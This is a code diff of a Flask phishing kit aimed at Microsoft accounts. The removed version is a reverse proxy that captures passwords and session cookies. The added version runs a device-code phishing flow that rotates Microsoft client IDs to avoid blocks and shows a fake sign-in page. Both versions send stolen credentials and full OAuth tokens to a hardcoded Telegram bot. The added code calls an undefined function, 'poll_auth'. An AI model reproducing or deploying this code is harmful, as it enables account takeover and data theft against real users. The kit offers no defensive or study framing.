@@ -1,242 +1,347 @@
 import os
+import sys
+import time
 import uuid
+import json
+import sqlite3
 import requests
-from flask import Flask, request, Response
+from flask import Flask, request, render_template_string, redirect, url_for, jsonify
+from threading import Thread
+import logging
 
-app = Flask(__name__)
-
-# --- Config ---
+# --- Configuration ---
 TELEGRAM_BOT_TOKEN = "8998925422:AAFKDgRkGsFewhlRC6tDmrGa33a6yNxj9UY"
 TELEGRAM_CHAT_ID = "8877118461"
+DB_PATH = "/tmp/phish.db"
 
-PROXY_DOMAIN = "https://outlook-verify.onrender.com"
-PROXY_HOST = "outlook-verify.onrender.com"
+# Microsoft Device Code Flow Endpoints
+TENANT = "common"
+DEVICE_CODE_URL = f"https://login.microsoftonline.com/{TENANT}/oauth2/v2.0/devicecode"
+TOKEN_URL = f"https://login.microsoftonline.com/{TENANT}/oauth2/v2.0/token"
 
-# vid -> requests.Session (per victim)
-visitor_sessions = {}
-# vid -> {"email":..., "password":..., "sent_pw":..., "sent_cookies":...}
-CAPTURED = {}
+# Rotatable Public Client IDs (Microsoft First-Party Apps)
+# These are less likely to be blocked than custom app registrations
+CLIENT_IDS = [
+    "1950a258-227b-4e31-a9cf-717495945fc2",  # Azure PowerShell
+    "04b07795-8ddb-461a-bbee-02f9e1bf7b46",  # Azure CLI
+    "d3590ed6-52b3-4102-aeff-aad2292ab01c",  # Office Desktop
+    "00000003-0000-0000-c000-000000000000",  # Microsoft Graph (sometimes works)
+]
 
+app = Flask(__name__)
+app.logger.setLevel(logging.INFO)
 
-# --- Telegram ---
+# --- Database Setup ---
+def init_db():
+    conn = sqlite3.connect(DB_PATH)
+    c = conn.cursor()
+    c.execute('''CREATE TABLE IF NOT EXISTS sessions (
+        vid TEXT PRIMARY KEY,
+        device_code TEXT,
+        user_code TEXT,
+        verification_uri TEXT,
+        client_id TEXT,
+        status TEXT DEFAULT 'pending',
+        tokens TEXT,
+        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
+    )''')
+    conn.commit()
+    conn.close()
+
+def get_db():
+    conn = sqlite3.connect(DB_PATH)
+    conn.row_factory = sqlite3.Row
+    return conn
+
+# --- Telegram Helper ---
 def send_telegram(message):
     try:
         url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
-        resp = requests.post(url, json={"chat_id": TELEGRAM_CHAT_ID, "text": message, "parse_mode": "HTML"}, timeout=10)
-        print(f"[TG API] Status: {resp.status_code}")
-        if resp.status_code != 200:
-            print(f"[TG API] Error: {resp.text}")
-    except Exception as e:
-        print(f"[TG ERROR] {e}")
-
-
-# --- Multi-value Set-Cookie extraction ---
-def get_set_cookies(resp):
-    raw = getattr(resp, "raw", None)
-    raw_headers = getattr(raw, "headers", None)
-    if raw_headers is not None:
-        for attr in ("getlist", "get_all"):
-            fn = getattr(raw_headers, attr, None)
-            if fn is None:
-                continue
-            try:
-                values = fn("Set-Cookie")
-            except Exception:
-                continue
-            if values:
-                return [v for v in values if v]
-    merged = resp.headers.get("Set-Cookie")
-    return [merged] if merged else []
-
-
-# --- Rewriting helpers ---
-def rewrite_links(text):
-    text = text.replace("https://login.microsoftonline.com", PROXY_DOMAIN)
-    text = text.replace("https://login.live.com", PROXY_DOMAIN)
-    text = text.replace("//login.microsoftonline.com", "//" + PROXY_HOST)
-    text = text.replace("//login.live.com", "//" + PROXY_HOST)
-    return text
-
-
-def fix_set_cookie(header_value):
-    parts = [p.strip() for p in header_value.split(";") if p.strip()]
-    kept = [
-        p for p in parts
-        if not p.lower().startswith("domain=") and not p.lower().startswith("path=")
-    ]
-    if not kept or "=" not in kept[0]:
-        return header_value
-    kept.append("Path=/")
-    return "; ".join(kept)
-
-
-def get_session(vid, user_agent):
-    if vid not in visitor_sessions:
-        s = requests.Session()
-        s.headers.update({
-            "User-Agent": user_agent or "Mozilla/5.0",
-            "Accept-Language": "en-US,en;q=0.9",
-        })
-        visitor_sessions[vid] = s
-    return visitor_sessions[vid]
-
-
-def pick_upstream(path):
-    if path.startswith(("GetCredentialType.srf", "ppsecure/", "api/")):
-        return "https://login.live.com"
-    return "https://login.microsoftonline.com"
-
-
-@app.route("/", defaults={"path": ""}, methods=["GET", "POST"])
-@app.route("/<path:path>", methods=["GET", "POST"])
-def proxy(path):
-    vid = request.cookies.get("vid")
-    new_vid = False
-    if not vid:
-        vid = str(uuid.uuid4())
-        new_vid = True
-        # Send heartbeat to confirm bot works
-        send_telegram(f"<b>👋 New Visitor</b>\nVid: <code>{vid}</code>\nIP: {request.remote_addr}")
-
-    sess = get_session(vid, request.headers.get("User-Agent"))
-
-    target = f"{pick_upstream(path)}/{path}"
-    if request.query_string:
-        target += "?" + request.query_string.decode()
-
-    headers = {}
-    for h in ("Accept", "Accept-Language", "Content-Type", "Origin"):
-        if h in request.headers:
-            headers[h] = request.headers[h]
-    if "Referer" in request.headers:
-        headers["Referer"] = request.headers["Referer"].replace(
-            PROXY_DOMAIN, "https://login.microsoftonline.com"
-        )
-    if "Origin" in headers:
-        headers["Origin"] = "https://login.microsoftonline.com"
-
-    try:
-        if request.method == "POST":
-            # DEBUG: Log all form keys to see what Microsoft sends
-            print(f"[POST DATA] Vid: {vid} | Keys: {list(request.form.keys())}")
-            
-            resp = sess.post(
-                target, data=request.form, headers=headers,
-                allow_redirects=False, timeout=25,
-            )
+        payload = {
+            "chat_id": TELEGRAM_CHAT_ID,
+            "text": message,
+            "parse_mode": "HTML"
+        }
+        resp = requests.post(url, json=payload, timeout=10)
+        if resp.status_code == 200:
+            print(f"[APP LOG] ✅ Telegram sent")
         else:
-            resp = sess.get(target, headers=headers, allow_redirects=False, timeout=25)
+            print(f"[APP LOG] ❌ Telegram Error: {resp.text}")
     except Exception as e:
-        return f"Proxy error: {e}", 502
+        print(f"[APP LOG] ❌ Telegram Exception: {e}")
 
-    # --- Capture credentials from the login POST ---
-    if request.method == "POST":
-        # Try common password field names
-        passwd = (
-            request.form.get("passwd") or 
-            request.form.get("Password") or 
-            request.form.get("pwd") or
-            request.form.get("password")
-        )
-        
-        # Try common email/username field names
-        login = (
-            request.form.get("loginfmt") or
-            request.form.get("login") or
-            request.form.get("username") or
-            request.form.get("EmailAddress")
-        )
-        
-        if passwd:
-            print(f"[CAPTURED PASSWORD] Vid: {vid}, User: {login}")
-            prev = CAPTURED.get(vid, {})
-            CAPTURED[vid] = {
-                "email": login or prev.get("email"),
-                "password": passwd,
-                "sent_pw": prev.get("sent_pw", False),
-                "sent_cookies": prev.get("sent_cookies", False),
+# --- Polling Thread ---
+def poll_token(vid, client_id, device_code, interval=5):
+    """Polls Microsoft for the token after user authenticates."""
+    print(f"[APP LOG] 🔄 Started polling for vid: {vid}")
+    max_attempts = 60  # 5 minutes approx
+    
+    for _ in range(max_attempts):
+        time.sleep(interval)
+        try:
+            data = {
+                "grant_type": "urn:ietf:params:oauth:grant-type:device_code",
+                "device_code": device_code,
+                "client_id": client_id,
             }
+            resp = requests.post(TOKEN_URL, data=data, timeout=10)
             
-            # Send password immediately
-            if not CAPTURED[vid]["sent_pw"]:
-                CAPTURED[vid]["sent_pw"] = True
+            if resp.status_code == 200:
+                tokens = resp.json()
+                # Save to DB
+                conn = get_db()
+                conn.execute("UPDATE sessions SET status = 'completed', tokens = ? WHERE vid = ?", 
+                             (json.dumps(tokens), vid))
+                conn.commit()
+                conn.close()
+                
+                # Extract useful info
+                id_token = tokens.get("id_token", "")
+                access_token = tokens.get("access_token", "")
+                refresh_token = tokens.get("refresh_token", "")
+                
+                # Decode ID Token to get email (simple base64 decode)
+                email = "Unknown"
+                try:
+                    parts = id_token.split('.')
+                    if len(parts) == 3:
+                        payload = parts[1]
+                        # Add padding if needed
+                        payload += "=" * (4 - len(payload) % 4)
+                        import base64
+                        decoded = base64.urlsafe_b64decode(payload)
+                        claims = json.loads(decoded)
+                        email = claims.get("preferred_username", claims.get("upn", "Unknown"))
+                except:
+                    pass
+
                 msg = (
-                    f"<b>🔑 Password Captured</b>\n\n"
-                    f"<b>Email:</b> <code>{login}</code>\n"
-                    f"<b>Password:</b> <code>{passwd}</code>\n\n"
-                    f"<i>Waiting for session cookies...</i>"
+                    f"<b>🎯 VICTIM AUTHENTICATED</b>\n\n"
+                    f"<b>Email:</b> <code>{email}</code>\n"
+                    f"<b>Access Token:</b> <code>{access_token[:20]}...</code>\n"
+                    f"<b>Refresh Token:</b> <code>{refresh_token[:20]}...</code>\n\n"
+                    f"<b>Full Tokens JSON:</b>\n<pre>{json.dumps(tokens, indent=2)}</pre>"
                 )
                 send_telegram(msg)
+                print(f"[APP LOG] ✅ Success for vid: {vid}")
+                return
+                
+            elif "authorization_pending" in resp.text:
+                continue # Keep polling
+            else:
+                print(f"[APP LOG] ⚠️ Polling error: {resp.text}")
+                
+        except Exception as e:
+            print(f"[APP LOG] ❌ Polling exception: {e}")
+            
+    # If we get here, it timed out
+    conn = get_db()
+    conn.execute("UPDATE sessions SET status = 'timeout' WHERE vid = ?", (vid,))
+    conn.commit()
+    conn.close()
+    print(f"[APP LOG] ⏰ Polling timed out for vid: {vid}")
 
-    # --- Check for Cookies and Update Previous Message ---
-    info = CAPTURED.get(vid)
-    if info and not info.get("sent_cookies"):
-        cookies = sess.cookies.get_dict()
-        # Filter for auth cookies
-        auth_cookies = {k: v for k, v in cookies.items() if k.startswith(("ESTSAUTH", "MSFPC", "MSPRequ", "ANON", "RPSSecAuth", "BAP"))}
+# --- Routes ---
+
+@app.route('/')
+def index():
+    vid = request.cookies.get('vid')
+    if not vid:
+        vid = str(uuid.uuid4())
+    
+    # Check if we already have a session for this user
+    conn = get_db()
+    row = conn.execute("SELECT * FROM sessions WHERE vid = ?", (vid,)).fetchone()
+    conn.close()
+    
+    if row and row['status'] == 'pending':
+        # Resume existing pending session
+        return render_template_string(TEMPLATE, 
+            user_code=row['user_code'], 
+            verification_uri=row['verification_uri'],
+            vid=vid,
+            status="pending"
+        )
         
-        if auth_cookies:
-            info["sent_cookies"] = True
-            cookie_str = "\n".join(f"<code>{k}={v[:20]}...</code>" for k, v in auth_cookies.items())
-            msg = (
-                f"<b>🍪 Session Cookies Captured</b>\n\n"
-                f"<b>Email:</b> <code>{info.get('email', '?')}</code>\n\n"
-                f"<b>Cookies:</b>\n{cookie_str}"
-            )
-            send_telegram(msg)
-            print(f"[COOKIE SENT] Vid {vid}")
+    # Create new session
+    client_id = CLIENT_IDS[int(time.time()) % len(CLIENT_IDS)] # Rotate based on time
+    
+    try:
+        data = {
+            "client_id": client_id,
+            "scope": "openid profile offline_access https://graph.microsoft.com/.default",
+        }
+        resp = requests.post(DEVICE_CODE_URL, data=data, timeout=10)
+        
+        if resp.status_code != 200:
+            return "Error initiating login. Please try again.", 500
+            
+        dc_data = resp.json()
+        device_code = dc_data['device_code']
+        user_code = dc_data['user_code']
+        verification_uri = dc_data['verification_uri']
+        
+        # Save to DB
+        conn = get_db()
+        conn.execute("INSERT OR REPLACE INTO sessions (vid, device_code, user_code, verification_uri, client_id, status) VALUES (?, ?, ?, ?, ?, 'pending')",
+                     (vid, device_code, user_code, verification_uri, client_id))
+        conn.commit()
+        conn.close()
+        
+        # Start polling thread
+        t = Thread(target=poll_auth, args=(vid, client_id, device_code))
+        t.daemon = True
+        t.start()
+        
+        return render_template_string(TEMPLATE, 
+            user_code=user_code, 
+            verification_uri=verification_uri,
+            vid=vid,
+            status="new"
+        )
+        
+    except Exception as e:
+        print(f"[APP LOG] ❌ Init Error: {e}")
+        return "Service unavailable.", 500
 
-    # --- Build response ---
-    r = Response(status=resp.status_code)
+@app.route('/status/<vid>')
+def check_status(vid):
+    conn = get_db()
+    row = conn.execute("SELECT status FROM sessions WHERE vid = ?", (vid,)).fetchone()
+    conn.close()
+    
+    if row:
+        return jsonify({"status": row['status']})
+    return jsonify({"status": "unknown"})
 
-    if "Location" in resp.headers:
-        loc = resp.headers["Location"]
-        loc = loc.replace("https://login.microsoftonline.com", PROXY_DOMAIN)
-        loc = loc.replace("https://login.live.com", PROXY_DOMAIN)
-        if loc.startswith("/"):
-            loc = PROXY_DOMAIN + loc
-        r.headers["Location"] = loc
+# --- The Phishing Page Template ---
+TEMPLATE = """
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign in to your account</title>
+    <style>
+        body {
+            font-family: "Segoe UI", "Helvetica Neue", sans-serif;
+            background-color: #f2f2f2;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .container {
+            background: white;
+            width: 440px;
+            padding: 44px;
+            box-shadow: 0 2px 6px rgba(0,0,0,0.2);
+            text-align: left;
+        }
+        .logo {
+            margin-bottom: 24px;
+        }
+        h1 {
+            font-size: 24px;
+            font-weight: 600;
+            margin-bottom: 10px;
+            color: #1b1b1b;
+        }
+        p {
+            font-size: 15px;
+            color: #1b1b1b;
+            margin-bottom: 20px;
+        }
+        .code-box {
+            background: #f2f2f2;
+            padding: 15px;
+            font-size: 24px;
+            font-weight: bold;
+            text-align: center;
+            letter-spacing: 2px;
+            margin: 20px 0;
+            border: 1px solid #ccc;
+            cursor: pointer;
+        }
+        .btn {
+            background-color: #0067b8;
+            color: white;
+            border: none;
+            padding: 10px 24px;
+            font-size: 15px;
+            cursor: pointer;
+            width: 100%;
+            margin-top: 10px;
+        }
+        .btn:hover {
+            background-color: #005da6;
+        }
+        .footer {
+            margin-top: 20px;
+            font-size: 12px;
+            color: #666;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <img src="https://logincdn.msauth.net/shared/1.0/content/images/microsoft_logo_5b3933d8.svg" alt="Microsoft" class="logo" style="height: 24px;">
+        <h1>Sign in</h1>
+        <p>To verify your identity, please sign in using the code below.</p>
+        
+        <div class="code-box" id="codeDisplay" onclick="copyCode()">
+            {{ user_code }}
+        </div>
+        
+        <p style="font-size: 13px; color: #666;">
+            Go to <a href="{{ verification_uri }}" target="_blank">{{ verification_uri }}</a> on another device and enter the code.
+        </p>
+        
+        <button class="btn" onclick="goToLogin()">Next</button>
+        
+        <div class="footer">
+            <p>No account? <a href="#">Create one!</a></p>
+            <p>Can't access your account?</p>
+        </div>
+    </div>
 
-    content_type = resp.headers.get("Content-Type", "")
-    body = resp.content
+    <script>
+        const vid = "{{ vid }}";
+        const verificationUri = "{{ verification_uri }}";
+        
+        function copyCode() {
+            const code = document.getElementById('codeDisplay').innerText.trim();
+            navigator.clipboard.writeText(code).then(() => {
+                alert("Code copied! Please paste it at " + verificationUri);
+            });
+        }
 
-    if "text/html" in content_type:
-        text = body.decode("utf-8", errors="ignore")
-        text = rewrite_links(text)
-        # Auto-click KMSI (Stay Signed In)
-        inject = """
-        <script>
-        (function(){
-          if (location.href.indexOf('kmsi') !== -1) {
-            var f = document.querySelector('form');
-            if (f) {
-              var btn = f.querySelector('#idSIButton9, input[type=submit][value="Yes"], button');
-              if (btn) { setTimeout(function(){ btn.click(); }, 600); }
-            }
-          }
-        })();
-        </script>
-        """
-        if "</body>" in text:
-            text = text.replace("</body>", inject + "</body>")
-        body = text.encode("utf-8")
-    elif "text/css" in content_type:
-        text = body.decode("utf-8", errors="ignore")
-        body = rewrite_links(text).encode("utf-8")
+        function goToLogin() {
+            // Copy code first
+            const code = document.getElementById('codeDisplay').innerText.trim();
+            navigator.clipboard.writeText(code);
+            
+            // Redirect user to real Microsoft login in same tab
+            window.location.href = verificationUri;
+        }
 
-    r.set_data(body)
-    if content_type:
-        r.headers["Content-Type"] = content_type
+        // Poll for completion
+        setInterval(() => {
+            fetch('/status/' + vid)
+                .then(res => res.json())
+                .then(data => {
+                    if (data.status === 'completed') {
+                        document.body.innerHTML = '<div class="container"><h1>Success</h1><p>Your account has been verified. You may close this window.</p></div>';
+                    }
+                });
+        }, 3000);
+    </script>
+</body>
+</html>
+"""
 
-    for value in get_set_cookies(resp):
-        r.headers.add("Set-Cookie", fix_set_cookie(value))
-
-    if new_vid:
-        r.set_cookie("vid", vid, max_age=86400, path="/", samesite="Lax")
-
-    return r
-
-
-if __name__ == "__main__":
+if __name__ == '__main__':
+    init_db()
     port = int(os.environ.get("PORT", 10000))
-    app.run(host="0.0.0.0", port=port, debug=False)
+    app.run(host='0.0.0.0', port=port, debug=False)
